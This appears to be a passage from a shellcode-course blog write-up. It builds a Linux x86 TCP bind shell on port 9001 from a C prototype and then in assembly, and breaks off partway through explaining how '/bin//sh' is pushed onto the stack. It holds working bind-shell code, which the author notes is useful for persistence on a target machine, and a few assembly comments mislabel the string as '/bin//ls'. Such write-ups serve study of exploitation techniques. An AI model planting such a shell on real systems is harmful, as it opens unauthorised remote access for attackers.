<p>My approach was to analyze TCP bind shell implementation in a higher-level language, such as C.</p>
<h3 id="c-prototype">C Prototype<a hidden class="anchor" aria-hidden="true" href="#c-prototype">#</a></h3>
<p>Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// from https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> sockfd, acceptfd;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9001</span>; <span style="color:#75715e">// Server Address struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">struct</span> sockaddr_in addr;
</span></span><span style="display:flex;"><span> addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span> addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port);
</span></span><span style="display:flex;"><span> addr.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;  <span style="color:#75715e">// 1) Socket Creation (sys_socket 1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// 2) Bind() Syscall (sys_bind 2)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">bind</span>(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr)); <span style="color:#75715e">// 3) Listen() Syscall (sys_listen 4)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">listen</span>(sockfd, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// 4) Accept() Syscall (sys_accept 5)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> acceptfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(sockfd, NULL, NULL); <span style="color:#75715e">// 5) Dup2() Syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">dup2</span>(acceptfd, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// stdin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">dup2</span>(acceptfd, <span style="color:#ae81ff">1</span>); <span style="color:#75715e">// stdout
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">dup2</span>(acceptfd, <span style="color:#ae81ff">2</span>); <span style="color:#75715e">// stderr // 6) Execve() Syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}  
</span></span></code></pre></div><p>Testing the code to see how it behaves.</p>
<p>Compiling with <em>gcc</em></p>
<p><code>$ gcc bind.c -o bind</code></p>
<p>Executing <em>bind</em> and using <em>nc</em> to perform a connection to port 9001 in localhost</p>
<p><img loading="lazy" src="/slae32/1/image.png#center" alt="C Bind Shell"  title="C Bind Shell"  />
</p>
<p>The C bind shell works as expected. From this we have a reference to build our shellcode.</p>
<h4 id="checking-which-syscalls-are-used">Checking which syscalls are used<a hidden class="anchor" aria-hidden="true" href="#checking-which-syscalls-are-used">#</a></h4>
<p>In total there are 6 syscalls enumerated below:</p>
<pre tabindex="0"><code>socket - 359 - 0x167

bind - 361 - 0x169

listen - 363 - 0x16b

accept4 - 364 - 0x16c

dup2 - 63 - 0x3f

execve - 11 - 0xb
</code></pre><p>We can use the file <code>/usr/include/x86_64-linux-gnu/asm/unistd_32 </code> to check the definiton of each syscall.</p>
<p>Let&rsquo;s dive into each syscall and analyse why they are used and how we can define them in intel x86 ISA.</p>
<h5 id="1---socket-syscall-0x167">1 - Socket syscall (0x167)<a hidden class="anchor" aria-hidden="true" href="#1---socket-syscall-0x167">#</a></h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#75715e">// 1) Socket Creation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><p>The socket syscall has 3 parameters</p>
<p><img loading="lazy" src="/slae32/1/image2.png#center" alt="Socket syscall"  title="Socket syscall"  />
</p>
<p><strong>domain</strong> - The domain argument specifies a communication  domain;  this  selects the protocol family which will be used for communication.</p>
<p>In this case, we are interested in the <strong>AF_INET</strong> flag which purpose is for IPv4 communication.</p>
<p>Searching on the internet for where Socket is defined in the Linux environment, I found <a href="https://stackoverflow.com/questions/4023343/where-is-socket-header-in-linux">this</a> Stackoverflow question.</p>
<p>After checking each one, the file <strong>/usr/include/x86_64-linux-gnu/bits/socket.h</strong> has the value we are looking for</p>
<p><img loading="lazy" src="/slae32/1/image3.png#center" alt="AF_INET"  title="AF_INET"  />
</p>
<p>We can use the find command this purpose too.</p>
<p><img loading="lazy" src="/slae32/1/image4.png#center" alt="PF_INET"  title="PF_INET"  />
</p>
<p>The domain value (<em>PF_INET</em>) = <strong>2</strong></p>
<p><strong>Type</strong> - specifies the communication semantics</p>
<p>The type is <strong>SOCK_STREAM = 1</strong></p>
<p><strong>protocol</strong> - The  protocol  specifies  a  particular  protocol to be used with the socket.</p>
<p>According to the man page page &ldquo;Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0&rdquo;</p>
<p>So, protocol = <strong>0</strong></p>
<p><strong>Translating to assembly:</strong></p>
<pre tabindex="0"><code>eax = 0x167
ebx = 0x2
ecx = 0x1
edx = 0
</code></pre><h5 id="2---bind-syscall-0x169">2 - Bind Syscall (0x169)<a hidden class="anchor" aria-hidden="true" href="#2---bind-syscall-0x169">#</a></h5>
<p>For this syscall the C code has the following structure:</p>
<ul>
<li>Struct sockaddr_in</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Server Address struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> sockaddr_in addr;
</span></span><span style="display:flex;"><span>addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port);
</span></span><span style="display:flex;"><span>addr.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY; 
</span></span></code></pre></div><ul>
<li>Bind Syscall</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> sockfd, acceptfd;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9001</span>; <span style="color:#75715e">// Server Address struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">struct</span> sockaddr_in addr;
</span></span><span style="display:flex;"><span> addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span> addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port);
</span></span><span style="display:flex;"><span> addr.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;  
</span></span><span style="display:flex;"><span> sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// 2) Bind() Syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">bind</span>(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>) <span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
</span></span></code></pre></div><p><img loading="lazy" src="/slae32/1/image6.png" alt="bind syscall"  title="bind syscall"  />
</p>
<p>With the following arguments:</p>
<ul>
<li>int <strong>sockfd</strong> - sockfd is the socket descriptor returned by socket() in eax.</li>
<li>const struct sockaddr *<strong>addr</strong> - pointer to struct sockaddr that contains information about your IP address and por</li>
<li>socklen_t <strong>addrlen</strong> - addrlen specifies the size, in bytes, of the address structure  pointed to by addr. In other words, <strong>addrlen is set to sizeof(struct sockaddr)</strong>.</li>
</ul>
<p><strong>int sockfd</strong></p>
<p>First things first, as we have the socket fil descriptor in <strong>eax</strong> we can put it directly in ebx, the first argument. &ndash;&gt; <strong>mov ebx, eax</strong></p>
<p><strong>const struct sockaddr *addr</strong></p>
<p>At first sight, defining the <strong>sockaddr struct</strong> appears to be complex but after some research on how to do it properly turns out to be really simple. We can define the struct using what I call the <strong>&ldquo;Struct Stack Technique&rdquo;</strong>. An adaption of the execve shellcode stack technique or jmp-call-pop technique.</p>
<p>We need to pass a pointer to the address of the struct. Using this technique, <strong>ESP will be used to pass the address to ecx</strong>.</p>
<p>Let&rsquo;s start creating our sockaddr to the stack. According to <a href="http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf">sockets programming tutorial</a> and the C code shown above this struct is defined by the following parameters:</p>
<p><img loading="lazy" src="/slae32/1/image10.png#center" alt="Sockaddr"  title="Sockaddr Parameters"  />
</p>
<p>In pratical terms:</p>
<ul>
<li>AF_INET -  0x2</li>
<li>Port Number -  <strong>9001</strong> (0x2329)</li>
<li>Internet Address - <strong>0.0.0.0</strong> (all IPv4 address in the local machine) -&gt; meaning we can establish a connection from any interface. Very good for persistence purposes</li>
<li>0</li>
</ul>
<p><strong>sockeln_t addrlen</strong></p>
<p>The value can be obtained from <code>/usr/include/linux/in.h</code> file (<code>#define \__SOCK_SIZE__   16</code>).</p>
<p><img loading="lazy" src="/slae32/1/image7.png" alt="Sock Size"  title="Sock Size"  />
</p>
<p>To be more specific the bind syscamll manual page as hints about the size. We know that is the size of the sockaddr struct. The man page as a specification on how this struct is organized.</p>
<p><img loading="lazy" src="/slae32/1/image9.png" alt="Sock Size"  title="Sock Size"  />
</p>
<p>From there, <strong>sa_data</strong> is defined as a char array of 14 used to define the protocol address. A char is 1 byte in size, so the array has 14 bytes.</p>
<blockquote>
<p><em>But what is sa_family_t type?</em></p>
</blockquote>
<p>Looking to <a href="http://home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf">sockets programming tutorial</a> (page 3), says it is an <strong>unsigned short</strong> and it refers to the <strong>AF_XXX address family</strong>. An unsigned short is equal to 2 bytes.</p>
<p>Searching where this type is defined in the filesystem it appeared this <a href="https://stackoverflow.com/questions/11924068/what-is-sa-family-t">stackoverflow</a> page pointing to this <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/sys_socket.h.html">doc</a> related to the sys/socket.h.</p>
<p>Searching in the filesystem, we confirm <strong>sa_family_t</strong> is defined as <strong>unsigned short type</strong>. The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/sys_socket.h.html">doc</a> also specifies it as <strong>unsigned int</strong> (2 bytes). See the <a href="https://en.wikipedia.org/wiki/C_data_types">C data types</a> page.</p>
<p><img loading="lazy" src="/slae32/1/image8.png" alt="Sock Size"  title="Sock Size"  />
</p>
<p>Doing the math, <strong>2 bytes + 14 bytes = 16 bytes</strong>. That&rsquo;s the confirmation for the sockaddr struct size.</p>
<h5 id="3---listen-syscall-0x16b">3 - Listen syscall (0x16b)<a hidden class="anchor" aria-hidden="true" href="#3---listen-syscall-0x16b">#</a></h5>
<p>It only requires 2 parameters. The <strong>socket field descriptor</strong> that we created before and backlog which is the number of connections allowed on the incoming queue. As we want our connection to be immediatily we put the value <strong>0</strong>.</p>
<p><img loading="lazy" src="/slae32/1/image11.png#center" alt="listen"  title="Listen syscall"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#75715e">// 3) Listen() Syscall 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">listen</span>(sockfd, <span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><h5 id="4---accept4-syscall-0x16b">4 - Accept4 syscall (0x16b)<a hidden class="anchor" aria-hidden="true" href="#4---accept4-syscall-0x16b">#</a></h5>
<p><img loading="lazy" src="/slae32/1/image12.png#center" alt="accept4"  title="Accept4 syscall"  />
</p>
<p>Simple syscall with four parameters. Returns a nonnegative integer that is a file descriptor for the accepted socket to eax register.</p>
<p>The man page states that addr can be NULL. For consequence <strong>addrlen</strong> must be NULL too. Also referes <em><strong>If flags is 0, then accept4() is the same as accept()</strong></em>.</p>
<p>Just need to null esi as according to the calling conventions &ndash;&gt; <strong>xor esi, esi</strong></p>
<p>We already have sockfd and the rest are null. Pretty easy to setup.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 4) Accept() Syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>acceptfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(sockfd, NULL, NULL); <span style="color:#75715e">// 5) Dup2() Syscall
</span></span></span></code></pre></div><h5 id="5---dup2-syscall-0x3f">5 - Dup2 syscall (0x3f)<a hidden class="anchor" aria-hidden="true" href="#5---dup2-syscall-0x3f">#</a></h5>
<p>Anyone familiar with OS stuff knows the use of the dup family syscalls.</p>
<p><img loading="lazy" src="/slae32/1/image13.png#center" alt="dup2"  title="Dup2 syscall"  />
</p>
<p>This just duplicates stdinput, stdout and stderror to the created TCP connection file descriptor. Doing this it redirects input and output the established connection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#75715e">// 5) Dup2() Syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">dup2</span>(acceptfd, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// stdin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">dup2</span>(acceptfd, <span style="color:#ae81ff">1</span>); <span style="color:#75715e">// stdout
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">dup2</span>(acceptfd, <span style="color:#ae81ff">2</span>); <span style="color:#75715e">// stderr
</span></span></span></code></pre></div><h5 id="6---execve-syscall-0xb">6 - Execve syscall (0xb)<a hidden class="anchor" aria-hidden="true" href="#6---execve-syscall-0xb">#</a></h5>
<p>At this moment, everything is set up and we just need to tell the program to execute <code>/bin/sh</code>. The execve takes 3 arguments but in this case we just need to fill the first argument to achieve our purposes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 6) Execve() Syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL);
</span></span></code></pre></div><h3 id="assembling-our-shellcode">&ldquo;Assembling&rdquo; our shellcode<a hidden class="anchor" aria-hidden="true" href="#assembling-our-shellcode">#</a></h3>
<p>Translating the above concepts to assembly follows the same steps. We just need to be careful to prepare and clean the registers according to each syscall, especially <strong>eax</strong>.</p>
<p>As eax is used to <strong>store the return data from a syscall</strong>, its content is always written and sometimes we need save eax&rsquo;s content before calling a syscall.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>    <span style="color:#75715e">; zeroes eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cdq</span>             <span style="color:#75715e">; zeroes edx (trick to use less space)
</span></span></span></code></pre></div><p>After this it&rsquo;s time to set up the syscall arguments havinmg the C code as a reference.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; socket syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x167</span>   <span style="color:#75715e">; syscall socket() - 359
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x02</span>  <span style="color:#75715e">; push and pop byte to save space (another trick)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebx</span>         <span style="color:#75715e">; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x01</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pop</span> <span style="color:#66d9ef">ecx</span>         <span style="color:#75715e">; setting up SOCK_STREAM = 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; edx is already zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>	<span style="color:#75715e">; interruption syscall or interrupt vector. Returns pointer to the socket in eax
</span></span></span></code></pre></div><p>EAX contains <strong>0x167</strong> which is sys_socket as seen in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code>, then EBX is set to <strong>0x2</strong> (PF_INET).</p>
<p>Next the value <strong>0x01</strong> is moved into ECX which is the value of <code>SOCK_STREAM</code>. EDX is already zero because of the previous <code>cdq</code> instruction.</p>
<p>Just left to use the interruption syscall <code>int 0x80</code> to create the socket.</p>
<p>If executed successfully, we have our socket. The next step is to setting up the <code>bind syscall</code>.</p>
<p>Beforehand, let&rsquo;s prepare the next syscall</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">eax</span> 	<span style="color:#75715e">; moves socket address to ebx (first arg of bind syscall - sockfd)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</span></span></code></pre></div><p>Then , the <code>sockaddr_in</code> struct is created as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	    <span style="color:#75715e">; edx remains zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;sockaddr struct	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	        <span style="color:#75715e">; edx is still zero -&gt; 0.0.0.0 - bind shell listens in all interfaces
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2923</span>    <span style="color:#75715e">; little endian -&gt; 9001 = 0x2329
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2</span>       <span style="color:#75715e">; AF_INET
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>        <span style="color:#75715e">; Putting the struct pointer in ECX
</span></span></span></code></pre></div><p>The struct is finally defined. The most trickiest part to understand I must say.</p>
<p><code>EDX</code> is still zero so pushing zeroes will effectively result into pushing the IP address <code>0.0.0.0</code>. This address makes the program to lsien in all interfaces. A clever way if our purpose is to have persistence in a target machine.</p>
<p>The next step is to load to the stack the port number. As intel works with little-edian format we push <code>0x2923</code> which is the value <code>9001</code>. Lastly, pushing <code>0x2</code>  refers to <code>AF_INET</code>.</p>
<p>Now, it is just a matter of putting <code>0x10</code> (16 bytes) to EDX which represents the size of <code>sockaddr_in</code> struct as mentioned in the previous section and execute the bind syscall with <code>0x169</code> in EAX.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x169</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span></code></pre></div><p>The follwoing syscalls are <code>listen</code> and <code>accept4</code> which work similarly as the above functions.</p>
<p>For the <code>accept4</code> we already have <code>sockfd</code> in <code>EBX</code> and we just need to clear the other arguments.</p>
<p>For <code>dup2</code> we use a loop to use less instructions to save space while constructing a fully interactive bind shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>    <span style="color:#75715e">; accept4 syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; ebx already has sockfd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cdq</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">esi</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x16c</span> 	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor edi, edi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">eax</span> <span style="color:#75715e">; edx is already zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; dup2 syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x03</span>
</span></span><span style="display:flex;"><span>dup2:
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor eax, eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">;mov al, 0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x3f</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">edx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dec</span> <span style="color:#66d9ef">cl</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">dup2</span>	<span style="color:#75715e">; decrements ecx and jumps until ecx=0
</span></span></span></code></pre></div><p>We reach the final stage, using <code>execve</code> syscall to execute <code>/bin/sh</code> and spawn a shell when a connection is made to the bind port.
If all works as expected a system shell will be provided to the incoming connection which can interact with the target machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; execve
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cdq</span>	            <span style="color:#75715e">; edx needs to be zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>	    <span style="color:#75715e">; ecx is zero because jnz and we avoid null bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span> <span style="color:#75715e">; /bin//ls
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">esp</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0xb</span>   <span style="color:#75715e">; execve syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span></code></pre></div><p>There is an important step in the above code that we must be aware of, how we place the string <code>/bin/sh</code> in the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>	    <span style="color:#75715e">; ecx is zero because jnz and we avoid null bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span> <span style="color:#75715e">; &#34;sl//&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span> <span style="color:#75715e">; &#34;nib/&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">esp</span>
</span></span></code></pre></div><p>The stack grows from high to low addresses, so we need to place <code>/bin/sh</code> and null terminated in reverse order. Besides that, one of the most important details we know is <code>memory alignment</code>. This highly influences the cpu performance and because of this it will attempt to maximmize the use of memory as efficient as possible.</p>
<p>The way it does in a 32-bit ISA is to work with multiples of 4 bytes in the memory address space. So, we need to make our string divisable by 4.</p>
<p>But <code>/bin/sh</code> is a 7 byte string, how we make it divisable by 4?</p>
